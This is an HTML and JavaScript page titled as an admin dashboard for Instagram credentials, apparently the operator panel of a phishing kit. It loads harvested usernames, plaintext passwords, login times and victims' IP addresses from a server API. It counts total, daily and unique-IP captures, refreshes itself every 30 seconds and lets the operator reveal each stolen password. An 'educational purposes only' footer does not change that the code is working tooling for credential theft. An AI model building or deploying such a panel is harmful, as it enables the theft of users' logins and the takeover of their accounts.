    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Instagram Credentials</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* Same styles as before plus these additions */
        .error-message {
            background-color: #f8d7da;
            color: #721c24;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            border: 1px solid #f5c6cb;
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            color: #666;
        }
        
        .loading i {
            margin-right: 8px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Admin Dashboard</h1>
            <p>View all Instagram login credentials</p>
        </div>
        
        <div class="content">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <button class="refresh-btn" onclick="loadCredentials()">
                    <i class="fas fa-sync-alt"></i> Refresh Data
                </button>
                <div>
                    <span id="lastUpdate" style="color: #657786; font-size: 14px;"></span>
                </div>
            </div>
            
            <div id="errorContainer" style="display: none;"></div>
            
            <div class="stats">
                <div class="stat-card">
                    <h3>Total Logins</h3>
                    <div class="number" id="totalLogins">0</div>
                </div>
                <div class="stat-card">
                    <h3>Today</h3>
                    <div class="number" id="todayLogins">0</div>
                </div>
                <div class="stat-card">
                    <h3>Unique IPs</h3>
                    <div class="number" id="uniqueIPs">0</div>
                </div>
            </div>
            
            <div class="table-container">
                <table id="credentialsTable">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Username/Email</th>
                            <th>Password</th>
                            <th>Login Time</th>
                            <th>IP Address</th>
                        </tr>
                    </thead>
                    <tbody id="tableBody">
                        <tr>
                            <td colspan="5" class="loading">
                                <i class="fas fa-spinner"></i> Loading credentials...
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
        
        <div class="footer">
            <p>⚠️ This is for educational purposes only. Never use for malicious purposes.</p>
        </div>
    </div>

    <script>
        async function loadCredentials() {
            const tableBody = document.getElementById('tableBody');
            const errorContainer = document.getElementById('errorContainer');
            const lastUpdateSpan = document.getElementById('lastUpdate');
            
            try {
                // Show loading state
                tableBody.innerHTML = '<tr><td colspan="5" class="loading"><i class="fas fa-spinner"></i> Loading credentials...</td></tr>';
                errorContainer.style.display = 'none';
                
                const response = await fetch('/api/admin/credentials');
                
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                const data = await response.json();
                
                // Update last update time
                lastUpdateSpan.textContent = `Last updated: ${new Date().toLocaleTimeString()}`;
                
                if (data.length === 0) {
                    tableBody.innerHTML = '<tr><td colspan="5" class="no-data">No credentials found</td></tr>';
                    document.getElementById('totalLogins').textContent = '0';
                    document.getElementById('todayLogins').textContent = '0';
                    document.getElementById('uniqueIPs').textContent = '0';
                    return;
                }
                
                // Calculate stats
                document.getElementById('totalLogins').textContent = data.length;
                
                const today = new Date().toDateString();
                const todayCount = data.filter(item => {
                    const loginDate = new Date(item.login_time).toDateString();
                    return loginDate === today;
                }).length;
                document.getElementById('todayLogins').textContent = todayCount;
                
                const uniqueIPsCount = new Set(data.map(item => item.ip_address)).size;
                document.getElementById('uniqueIPs').textContent = uniqueIPsCount;
                
                // Build table
                let html = '';
                data.forEach(item => {
                    html += `
                        <tr>
                            <td>${item.id}</td>
                            <td>${escapeHtml(item.username)}</td>
                            <td>
                                <span class="danger-badge">••••••••</span>
                                <span style="display:none">${escapeHtml(item.password)}</span>
                                <button onclick="togglePassword(this)" style="margin-left: 8px; background: none; border: none; color: #0095f6; cursor: pointer;">
                                    <i class="fas fa-eye"></i>
                                </button>
                            </td>
                            <td>${new Date(item.login_time).toLocaleString()}</td>
                            <td>${item.ip_address || 'N/A'}</td>
                        </tr>
                    `;
                });
                
                tableBody.innerHTML = html;
                
            } catch (error) {
                console.error('Error loading credentials:', error);
                
                errorContainer.style.display = 'block';
                errorContainer.className = 'error-message';
                errorContainer.innerHTML = `
                    <i class="fas fa-exclamation-triangle"></i>
                    Error loading credentials: ${error.message}. 
                    Please check if the server is running.
                `;
                
                tableBody.innerHTML = '<tr><td colspan="5" class="no-data">Failed to load credentials</td></tr>';
            }
        }
        
        // Helper function to escape HTML
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // Toggle password visibility
        function togglePassword(button) {
            const passwordSpan = button.previousElementSibling;
            const icon = button.querySelector('i');
            
            if (passwordSpan.style.display === 'none') {
                passwordSpan.style.display = 'inline';
                icon.className = 'fas fa-eye-slash';
            } else {
                passwordSpan.style.display = 'none';
                icon.className = 'fas fa-eye';
            }
        }
        
        // Load credentials on page load
        window.onload = loadCredentials;
        
        // Auto-refresh every 30 seconds
        setInterval(loadCredentials, 30000);
    </script>
</body>
</html>
